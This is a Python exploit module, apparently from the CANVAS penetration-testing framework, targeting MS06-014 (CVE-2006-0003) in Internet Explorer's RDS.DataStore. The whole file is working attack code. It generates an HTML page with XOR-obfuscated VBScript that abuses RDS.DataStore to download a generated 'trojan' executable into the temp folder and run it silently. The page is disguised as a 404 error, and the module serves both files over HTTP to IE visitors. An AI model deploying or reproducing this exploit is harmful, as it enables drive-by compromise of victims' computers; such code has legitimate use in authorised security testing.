#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "RDS Datastore (MS06-014)"
DESCRIPTION                     = "Misdesign in RDS.DataStore allows for arbitrary object execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2006-0003"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVS-2006-0003"
DOCUMENTATION['CVSS'] = 5.1
DOCUMENTATION["MSRC"]           = "http://www.microsoft.com/technet/security/Bulletin/MS06-014.mspx"
DOCUMENTATION["Date public"]    = "4/11/2006"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = [ "98","ME","2000","XP","2003" ]
PROPERTY['MSADV']               = "MS06-014"
PROPERTY['DELIVERY']            = 'HTTP'

NOTES="""
To test from Commandline (no need for fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ms06_014 -l 192.168.98.1 -p 8080 -d 5555
"""

def xorencode(astr,key):
    """
    Quicky XOR encode with 0xa5
    """
    tmp=[]
    for c in astr:
        tmp+=[chr(ord(c)^key)]
    return "".join(tmp)


def chrencode(astr):
    """
    \x41 -> Chr(whatever 41 is in decimal)
    """
    tmp=[]
    for c in astr:
        tmp+=["Chr(%d)"%ord(c)]
    return "&".join(tmp)
    
import random
def vbencode(sploitcode):
    """
    Encode a Visual Basic script and produce a string that is just the decoder and value
    """
    key                 = random.randint(1,255)
    encodedsploitcode   = chrencode(xorencode(sploitcode,key))
    out = "encoded=%s\n" % encodedsploitcode
    out +="""
           decoded=""
           'iLoop=0
           
           For iLoop=1 to Len(encoded)
               tmp = asc(Mid(encoded,iLoop,1))
               ' VBScript can't do 0xa5
               tmp2= tmp xor KEY
               
               decoded=decoded + Chr(tmp2)
               ' decoded=decoded + "Q"
           next 
           ' document.write("Write3!")
           ' document.write(encoded)
           ' document.write(decoded)
           Execute(decoded)
           ' document.write("Done execute")
         
    """.replace("KEY","%d"%key)
    return out

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod       = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent          = [("Mozilla/", "MSIE", "")]
        self.shellcode          = "\xcc" * 298
        self.setVersions()
        self.version            = 1
        self.badstring          = ''
        self.name               = NAME 
        self.filename           = "test.html"
        self.downloadfilename   = "bob.txt"
        self.destinationname    = "test4.com"
        # controls whether we print out debug information into the web page
        # If you turn debug on and it goes to 3e and no further, it's 
        # probably patched
        self.debug              = 0
        # this is needed for the httpserver2
        self.fsm_done           = False
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        self.versions[1]=("Windows - all versions", None)

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
    
    def createShellcode(self):
        return self.createWin32ClientSideShellcode()
    
    def run(self):
        self.host       = self.target.interface
        self.filename   = self.argsDict.get("filename", self.filename)
        filedata        = self.makefile()
        self.log("Opening %s for output" % self.filename)
        fd              = file(self.filename, "wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s" % self.filename)
        return 1

    def makedownloadfile(self):
        """Makes the trojan code file"""

        import pelib
        p       = pelib.PElib()
        imports = [ ("advapi32.dll",\
                     ["RevertToSelf", "AccessCheck"]),\
                    ("urlmon.dll",\
                     ["URLDownloadToFileA", "FindMediaType" ]) ] 
        filedata = p.createPEFileBuf(self.shellcode, imports)
        return filedata
        
    def makefile(self):
        """Makes the actual bad html file to trigger the object spoofing"""
        self.createShellcode()
        
        babybottlehtml="""
        <title></title>
        <head></head>
        <body>
        
        <script language="VBScript">
        on error resume next
        """
        
        sploitcode="""
        document.write("DEBUG: INSIDE 1 <br>")
        x=location.href
        
        document.write("DEBUG: INSIDE 2 <br>")
        y=InStrRev(x,"/")
        if y<>0 then
           x=left(x,y)           
        end if
                
        URL2= x & "DOWNLOADFILENAME"
        document.write("DEBUG: INSIDE 3a <br>")
        Set df = document.createElement("object")
        document.write("DEBUG: INSIDE 3b <br>")
        df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
        document.write("DEBUG: INSIDE 3c <br>")
        str="Microsoft.XMLHTTP"
        document.write("DEBUG: INSIDE 3d <br>")
        str6="GET"
        document.write("DEBUG: INSIDE 3e <br>")
        Set x = df.CreateObject(str,"")
        document.write("DEBUG: INSIDE 3f <br>")

        document.write("DEBUG: INSIDE 3g <br>")
        
        a1="Ado"
        a2="db."
        a3="Str"
        a4="eam"
        document.write("DEBUG: INSIDE 3h <br>")
        str1=a1&a2&a3&a4
        str5=str1
        document.write("DEBUG: INSIDE 3i <br>")
        set S = df.createobject(str5,"")
        document.write("DEBUG: INSIDE 3j <br>")
        S.type = 1
        document.write("DEBUG: INSIDE 3k <br>")
        str6="GET"
        x.Open str6, URL2, False
        document.write("DEBUG: INSIDE 3l <br>")
        x.Send
        document.write("DEBUG: INSIDE 3m <br>")
        ' Get temp directory and create our destination name
        fname1="DESTINATIONNAME"
        document.write("DEBUG: Fname1="&fname1&"<br>")
        set F = df.createobject("Scripting.FileSystemObject","")
        document.write("DEBUG: Got F <br>")
        set tmp = F.GetSpecialFolder(2) ' Get tmp folder
        document.write("DEBUG: TMP="&tmp&"<br>")
        fname1= F.BuildPath(tmp,fname1)
        document.write("DEBUG: Fname1="&fname1&"<br>")
        document.write("DEBUG: INSIDE 3n <br>")
        S.open
        document.write("DEBUG: INSIDE 4o <br>")
        """
        #' Write our data into this stream
        sploitcode+="""
        S.write x.responseBody
        """
        #' Saves it with CreateOverwrite flag
        sploitcode+="""
        S.savetofile fname1,2
        S.close
        set Q = df.createobject("Shell.Application","")
        document.write("DEBUG: INSIDE 5 <br>")
        Q.ShellExecute fname1,"","","open",0
        """        
        if not self.debug:
            sploitcode = sploitcode.replace("document.write(\"DEBUG: ","' document.write(\"DEBUG: ")
        sploitcode          = sploitcode.replace("DOWNLOADFILENAME", self.downloadfilename)
        sploitcode          = sploitcode.replace("DESTINATIONNAME", self.destinationname)
        encodedsploitcode   = vbencode(sploitcode)
        babybottlehtml      += encodedsploitcode
        babybottlehtml      += """
        </script>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        The requested URL /test.html was not found on this server.<p>
        <hr>
        </body>
        
        </html>
        """  
        filedata = babybottlehtml
        self.log("Setup HTML file to download file %s to %s" % (self.downloadfilename, self.destinationname))
        return filedata
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h           = header("SERVER")
        b           = body()
        user_agent  = clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE") == 0:
            # still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non IE browser connected - returning None")
            return None,None
        
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log("Sending the ms06_014 attack html file")
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader("Content-Type","text/html")
            
        elif clientheader.URL.count(self.downloadfilename):
            self.log("Sending the trojan exe file")
            sploitstring = self.makedownloadfile()
            self.log("Sending %d bytes" % len(sploitstring))
            h.addHeader("Content-type","binary/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
            
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status = "302"
            h.addHeader("Location", self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
